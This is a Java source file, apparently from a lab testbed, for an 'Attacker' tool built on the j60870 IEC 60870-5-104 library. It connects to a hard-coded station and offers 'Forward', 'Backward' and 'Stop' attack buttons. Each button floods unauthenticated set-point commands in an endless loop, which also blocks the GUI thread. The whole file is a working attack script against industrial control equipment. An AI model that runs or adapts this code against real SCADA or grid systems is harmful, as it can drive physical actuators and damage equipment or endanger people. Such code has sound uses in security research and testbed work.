/*
 * Copyright 2014-17 Fraunhofer ISE
 *
 * This file is part of j60870.
 * For more information visit http://www.openmuc.org
 *
 * j60870 is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * j60870 is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with j60870.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
package main.java.org.openmuc.j60870.app;

import java.awt.BorderLayout;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeoutException;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;

import java.awt.event.ActionListener;

import lejos.utility.Delay;
import main.java.org.openmuc.j60870.ASdu;
import main.java.org.openmuc.j60870.CauseOfTransmission;
import main.java.org.openmuc.j60870.ClientConnectionBuilder;
import main.java.org.openmuc.j60870.Connection;
import main.java.org.openmuc.j60870.ConnectionEventListener;
import main.java.org.openmuc.j60870.IeNormalizedValue;
import main.java.org.openmuc.j60870.IeQualifierOfSetPointCommand;
import main.java.org.openmuc.j60870.internal.cli.CliParameter;
import main.java.org.openmuc.j60870.internal.cli.CliParameterBuilder;
import main.java.org.openmuc.j60870.internal.cli.CliParseException;
import main.java.org.openmuc.j60870.internal.cli.CliParser;
import main.java.org.openmuc.j60870.internal.cli.IntCliParameter;
import main.java.org.openmuc.j60870.internal.cli.StringCliParameter;

public final class Attacker {
	
	static JButton bbattack, bfattack, bsattack, bquit, bactibarrier;
	static JFrame frame;
	static JPanel panel_int, panel_motor;
	
	//Initialization of Host and Port parameters
    private static final StringCliParameter hostParam = new CliParameterBuilder("-h").buildStringParameter("host", "192.168.43.11");
    private static final IntCliParameter portParam = new CliParameterBuilder("-p")
            .setDescription("The port to connect to.").buildIntParameter("port", 2404);
    private static final IntCliParameter commonAddrParam = new CliParameterBuilder("-ca")
            .setDescription("The address of the target station or the broad cast address.")
            .buildIntParameter("common_address", 1);

    private static volatile Connection connection;

    //Listen the response given by the server
    private static class ClientEventListener implements ConnectionEventListener {
    	
        @Override
        public void newASdu(ASdu aSdu) {
        	System.out.println("\nReceived ASDU:\n" + aSdu);
        	
        }

        @Override
        public void connectionClosed(IOException e) {
            System.out.print("Received connection closed signal. Reason: ");
            if (!e.getMessage().isEmpty()) {
                System.out.println(e.getMessage());
            }
            else {
                System.out.println("unknown");
            }
            connection.close();
        }

    }
    
    
    public static void main(String[] args) {
    	//IP Address initialization
        InetAddress address;
        try {
            address = InetAddress.getByName(hostParam.getValue());
        } catch (UnknownHostException e) {
            System.out.println("Unknown host: " + hostParam.getValue());
            return;
        }

        ClientConnectionBuilder clientConnectionBuilder = new ClientConnectionBuilder(address)
                .setPort(portParam.getValue());

        //Connection established
        try {
            connection = clientConnectionBuilder.connect();
        } catch (IOException e) {
            System.out.println("Unable to connect to remote host: " + hostParam.getValue() + ".");
            return;
        }

        Runtime.getRuntime().addShutdownHook(new Thread() {
            @Override
            public void run() {
                connection.close();
            }
        });

        //Starting data transfer
        try {
            connection.startDataTransfer(new ClientEventListener(), 5000);
        } catch (TimeoutException e2) {
            System.out.println("Starting data transfer timed out. Closing connection.");
            connection.close();
            return;
        } catch (IOException e) {
            System.out.println("Connection closed for the following reason: " + e.getMessage());
            return;
        }
        System.out.println("successfully connected");
        

    	//Graphic Interface
    	JFrame frame = new JFrame("Dashboard");
    	frame.setSize(500, 500);
    	frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    	frame.setVisible(true);	
    	
    	//"Forward Attack" Button
    	JButton bfattack= new JButton("Forward Attack");
    	bfattack.addActionListener(new ActionListener(){
			public void actionPerformed(java.awt.event.ActionEvent e){
				System.out.println("** Sending 'Forward Attack' command. ** \n");
				while(true){
					try {
						connection.setNormalizedValueCommand(commonAddrParam.getValue(), CauseOfTransmission.ACTIVATION, 2, 
								new IeNormalizedValue(1), new IeQualifierOfSetPointCommand(0,false));
						Delay.msDelay(1000);
					} catch (IOException e1) {
						e1.printStackTrace();
					}
				}
					
			}
    	});	
    	
    	//"Backward Attack" Button
    	JButton bbattack= new JButton("Backward Attack");
    	bbattack.addActionListener(new ActionListener(){
			public void actionPerformed(java.awt.event.ActionEvent e){
				System.out.println("** Sending 'Backward Attack' command. ** \n");
				while(true){
					try {
						connection.setNormalizedValueCommand(commonAddrParam.getValue(), CauseOfTransmission.ACTIVATION, 2, 
								new IeNormalizedValue(-1), new IeQualifierOfSetPointCommand(0,false));
						Delay.msDelay(1000);
					} catch (IOException e1) {
						e1.printStackTrace();
					}
				}
					
			}
    	});	
    	
    	//"Stop Attack" Button
    	JButton bsattack= new JButton("Stop Attack");
    	bsattack.addActionListener(new ActionListener(){
			public void actionPerformed(java.awt.event.ActionEvent e){
				System.out.println("** Sending 'Stop Attack' command. ** \n");
				while(true){
					try {
						connection.setNormalizedValueCommand(commonAddrParam.getValue(), CauseOfTransmission.ACTIVATION, 2, 
								new IeNormalizedValue(0), new IeQualifierOfSetPointCommand(0,false));
						Delay.msDelay(1000);
					} catch (IOException e1) {
						e1.printStackTrace();
					}
				}
					
			}
    	});	
    	
    	//"Disconnection" Button
    	JButton bquit = new JButton("Disconnection");
    	bquit.addActionListener(new ActionListener(){
			public void actionPerformed(java.awt.event.ActionEvent e){
	            System.out.println("** Closing connection. ** \n");
	            connection.close();
			}
		});    
    	
    	//Add buttons on the dashboard
    	JPanel panel_int = new JPanel();
    	frame.add(panel_int, BorderLayout.NORTH);
    	panel_int.add(bfattack);
    	panel_int.add(bbattack);
    	panel_int.add(bsattack);
    	panel_int.add(bquit);

    }

}
